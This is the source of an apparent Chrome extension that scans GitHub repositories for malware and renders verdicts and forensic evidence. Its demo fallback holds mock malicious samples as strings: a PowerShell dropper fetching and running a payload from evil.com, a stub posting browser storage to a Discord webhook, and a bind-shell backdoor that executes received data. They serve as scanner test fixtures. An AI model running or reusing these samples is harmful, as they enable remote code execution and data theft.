import { useState, useEffect } from 'react';
import { Shield, Search, Terminal, Code, ChevronDown, ChevronRight, Download, CheckCircle } from 'lucide-react';
import { scanFile } from './utils/scanner';
import { analyzeMatches } from './utils/analysis';
import type { AnalysisResult, ThreatMatch } from './types/scanner';
import clsx from 'clsx';
import { motion, AnimatePresence } from 'framer-motion';
import { generatePDFReport } from './utils/report';

function App() {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [currentRepo, setCurrentRepo] = useState<string | null>(null);
  const [scannedFilesCount, setScannedFilesCount] = useState<number>(0);
  const [expandedThreat, setExpandedThreat] = useState<number | null>(null);

  const startScan = async () => {
    if (!currentRepo) return;
    setLoading(true);
    setResult(null);
    setScannedFilesCount(0);

    try {
      const parts = currentRepo.split('/');
      const owner = parts[0];
      const repo = parts[1];

      let files: { path: string, content: string }[] = [];
      let allMatches: ThreatMatch[] = [];

      try {
        const { fetchRepoZip, extractFiles } = await import('./utils/github');
        const zip = await fetchRepoZip(owner, repo);
        files = await extractFiles(zip);
      } catch (e) {
        // Fallback for demo
        const isLocal = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
        if (isLocal) {
          console.warn("Using Mock Data");
          files = [
            { path: 'src/dropper.ps1', content: 'Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "C:\\tmp\\svchost.exe"; Start-Process "C:\\tmp\\svchost.exe"' },
            { path: 'src/stealer.py', content: 'import sqlite3\nconn = sqlite3.connect("Local Storage/leveldb")\nrequests.post("https://discord.com/api/webhooks/1234", data=data)' },
            { path: 'src/backdoor.py', content: 's = socket.socket(); s.bind(("0.0.0.0", 4444)); s.listen(5); while True: c,a = s.accept(); exec(c.recv(1024))' }
          ];
        } else {
          throw e;
        }
      }

      for (const file of files) {
        await new Promise(r => setTimeout(r, 2)); // Faster non-blocking
        const matches = scanFile(file.path, file.content);
        allMatches = [...allMatches, ...matches];
        setScannedFilesCount(prev => prev + 1);
      }

      const analysis = analyzeMatches(allMatches, currentRepo, files.length);
      setResult(analysis);

    } catch (error: any) {
      console.error(error);
      alert(`Scan failed: ${error.message}`);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (typeof chrome !== 'undefined' && chrome.tabs) {
      chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        const url = tabs[0]?.url;
        if (url && url.includes('github.com')) {
          const parts = url.split('/');
          if (parts.length >= 5) setCurrentRepo(`${parts[3]}/${parts[4]}`);
        }
      });
    } else {
      setCurrentRepo('demo/malware-repo');
    }
  }, []);

  const getVerdictStyle = (verdict: string) => {
    switch (verdict) {
      case 'SAFE': return { color: 'text-emerald-400', shadow: 'shadow-emerald-500/20', border: 'border-emerald-500/30' };
      case 'DUAL-USE': return { color: 'text-blue-400', shadow: 'shadow-blue-500/20', border: 'border-blue-500/30' };
      case 'SUSPICIOUS': return { color: 'text-amber-400', shadow: 'shadow-amber-500/20', border: 'border-amber-500/30' };
      case 'MALICIOUS': return { color: 'text-red-500', shadow: 'shadow-red-500/30', border: 'border-red-500/50' };
      default: return { color: 'text-gray-400', shadow: 'shadow-none', border: 'border-white/10' };
    }
  };

  const exportPDF = async () => {
    if (!result) return;
    try {
      generatePDFReport(result);
    } catch (e: any) {
      console.error(e);
      alert("Failed to generate report: " + e.message);
    }
  };

  return (
    <div className="w-[450px] min-h-[600px] bg-[#0F1115] text-white font-sans overflow-hidden selection:bg-purple-500/30">

      {/* Header */}
      <header className="bg-[#161B22] p-4 border-b border-white/10 flex items-center justify-between backdrop-blur-md sticky top-0 z-50">
        <div className="flex items-center gap-3">
          <div className="relative">
            <Shield className="w-6 h-6 text-purple-500" />
            <div className="absolute inset-0 bg-purple-500/50 blur-lg rounded-full opacity-50"></div>
          </div>
          <h1 className="font-bold text-lg tracking-tight bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
            SENTINEL<span className="font-thin text-white/50">core</span>
          </h1>
        </div>
        <div className="px-2 py-0.5 rounded text-[10px] bg-white/5 border border-white/10 text-white/50">
          EXPERT AI MODE
        </div>
      </header>

      <main className="p-5">
        {/* Repo Target */}
        <div className="mb-8 text-center relative">
          <div className="absolute top-1/2 left-0 w-full h-[1px] bg-gradient-to-r from-transparent via-white/10 to-transparent"></div>
          <span className="relative bg-[#0F1115] px-4 text-xs text-gray-500 uppercase tracking-widest font-semibold">
            Target Repository
          </span>
          <p className="mt-2 font-mono text-purple-400 text-sm truncate px-4">{currentRepo || "No Repository Detected"}</p>
        </div>

        {/* Action Button */}
        {!loading && !result && (
          <motion.button
            whileHover={{ scale: 1.02, boxShadow: "0 0 20px rgba(139, 92, 246, 0.3)" }}
            whileTap={{ scale: 0.98 }}
            onClick={startScan}
            className="w-full bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold py-4 px-6 rounded-xl shadow-lg border border-white/10 flex items-center justify-center gap-3 group"
          >
            <Search className="w-5 h-5 group-hover:animate-pulse" />
            INITIATE CONTEXTUAL SCAN
          </motion.button>
        )}

        {/* Loading State */}
        {loading && (
          <div className="flex flex-col items-center justify-center py-12 space-y-6">
            <div className="relative w-32 h-32">
              <svg className="w-full h-full rotate-[-90deg]" viewBox="0 0 36 36">
                <path className="text-white/5" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="currentColor" strokeWidth="2" />
                <path className="text-purple-500 drop-shadow-[0_0_10px_rgba(168,85,247,0.5)]" strokeDasharray="100, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="currentColor" strokeWidth="2"
                  style={{
                    strokeDashoffset: 100 - (scannedFilesCount % 100),
                    transition: 'stroke-dashoffset 0.1s ease'
                  }}
                />
              </svg>
              <div className="absolute inset-0 flex flex-col items-center justify-center">
                <span className="text-2xl font-bold font-mono">{scannedFilesCount}</span>
                <span className="text-[10px] text-gray-500 uppercase">Files</span>
              </div>
            </div>
            <div className="space-y-1 text-center">
              <p className="text-sm font-medium text-purple-300 animate-pulse">Contextual Intelligence Active</p>
              <p className="text-xs text-gray-600">Verifying logical consistency...</p>
            </div>
          </div>
        )}

        {/* Results View */}
        {result && !loading && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="space-y-6 pb-10"
          >
            {/* Result Card */}
            {(() => {
              const styles = getVerdictStyle(result.verdict);
              return (
                <div className={`bg-[#161B22] border ${styles.border} rounded-2xl p-6 relative overflow-hidden`}>
                  <div className="absolute top-0 right-0 p-3 opacity-10">
                    {result.verdict === 'SAFE' ? <CheckCircle className="w-32 h-32" /> : <Shield className="w-32 h-32" />}
                  </div>

                  <div className="flex justify-between items-start relative z-10">
                    <div>
                      <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-1">AI Verdict</p>
                      <h2 className={`text-4xl font-black tracking-tight mb-2 flex items-center gap-2 ${styles.color} drop-shadow-[0_0_10px_rgba(0,0,0,0.5)]`}>
                        {result.verdict}
                      </h2>
                      <div className="flex gap-2 flex-wrap items-center">
                        <span className="bg-white/5 text-gray-300 px-2 py-0.5 rounded text-[10px] font-mono border border-white/10 uppercase">
                          CTX: {result.projectContext.type.replace('_', ' ')}
                        </span>
                        {result.primaryType !== 'NONE' && (
                          <span className={`px-2 py-0.5 text-[10px] uppercase font-bold bg-white/5 border border-white/10 rounded ${styles.color}`}>
                            {result.primaryType}
                          </span>
                        )}
                      </div>
                    </div>
                    <div className="text-right">
                      <div className={`text-3xl font-bold ${styles.color}`}>{result.confidence}%</div>
                      <p className="text-[10px] text-gray-500 uppercase mt-1">Confidence</p>
                    </div>
                  </div>

                  <div className="mt-6 pt-4 border-t border-white/5">
                    <p className="text-xs text-gray-400 leading-relaxed font-mono whitespace-pre-wrap">
                      {result.explanation}
                    </p>
                  </div>
                </div>
              );
            })()}

            {/* Detected Chains */}
            {result.attackChain.length > 0 && (
              <div className="space-y-2">
                <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                  <Terminal className="w-3 h-3" />
                  Kill Chain Reconstruction
                </h3>
                <div className="bg-[#161B22]/50 border border-red-500/20 rounded-xl p-4">
                  {result.attackChain.map((chain, i) => (
                    <div key={i} className="flex items-center gap-2 text-sm text-red-300 mb-2 last:mb-0">
                      <div className="w-2 h-2 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.8)]"></div>
                      <span className="font-bold">{chain}</span>
                      <span className="text-gray-600 text-xs ml-auto">CRITICAL</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Evidence List */}
            <div className="space-y-2">
              <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest flex items-center gap-2">
                <Code className="w-3 h-3" />
                Forensic Evidence ({result.matches.length})
              </h3>

              {result.matches.length === 0 ? (
                <div className="p-4 bg-[#161B22] rounded-lg border border-white/5 text-center text-gray-500 text-xs italic">
                  No suspicious indicators found. Codebase appears clean.
                </div>
              ) : (
                <div className="space-y-2 max-h-[300px] overflow-y-auto pr-2 custom-scrollbar">
                  {result.matches.map((match, idx) => (
                    <div
                      key={idx}
                      className={`group bg-[#161B22] border border-white/5 rounded-lg overflow-hidden transition-all ${expandedThreat === idx ? 'ring-1 ring-purple-500/50' : 'hover:border-white/20'}`}
                    >
                      <div
                        className="p-3 flex items-center justify-between cursor-pointer"
                        onClick={() => setExpandedThreat(expandedThreat === idx ? null : idx)}
                      >
                        <div className="flex items-center gap-3 overflow-hidden">
                          <div className={clsx("w-1.5 h-1.5 rounded-full flex-shrink-0",
                            match.severity === 'critical' ? 'bg-red-500' :
                              match.severity === 'high' ? 'bg-orange-500' : 'bg-blue-500'
                          )}></div>
                          <div className="flex flex-col min-w-0">
                            <span className="text-xs font-bold text-gray-300 truncate">{match.capability.toUpperCase().replace('_', ' ')}</span>
                            <span className="text-[10px] text-gray-600 truncate font-mono">{match.file.split('/').slice(-2).join('/')}:{match.line}</span>
                          </div>
                        </div>
                        <div className="text-gray-600">
                          {expandedThreat === idx ? <ChevronDown className="w-4 h-4" /> : <ChevronRight className="w-4 h-4" />}
                        </div>
                      </div>

                      <AnimatePresence>
                        {expandedThreat === idx && (
                          <motion.div
                            initial={{ height: 0 }}
                            animate={{ height: 'auto' }}
                            exit={{ height: 0 }}
                            className="bg-[#0D1117] border-t border-white/5"
                          >
                            <div className="p-3 space-y-2">
                              <p className="text-xs text-gray-400">{match.description}</p>
                              <div className="bg-black/30 p-2 rounded border border-white/5 font-mono text-[10px] text-gray-300 overflow-x-auto whitespace-pre">
                                {match.content}
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </div>
                  ))}
                </div>
              )}
            </div>

            <div className="flex gap-2">
              <button
                onClick={exportPDF}
                className="flex-1 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs font-bold text-gray-400 uppercase tracking-widest flex items-center justify-center gap-2 transition-all"
              >
                <Download className="w-4 h-4" /> Export Report
              </button>
            </div>

          </motion.div>
        )}
      </main>
    </div>
  );
}

export default App;
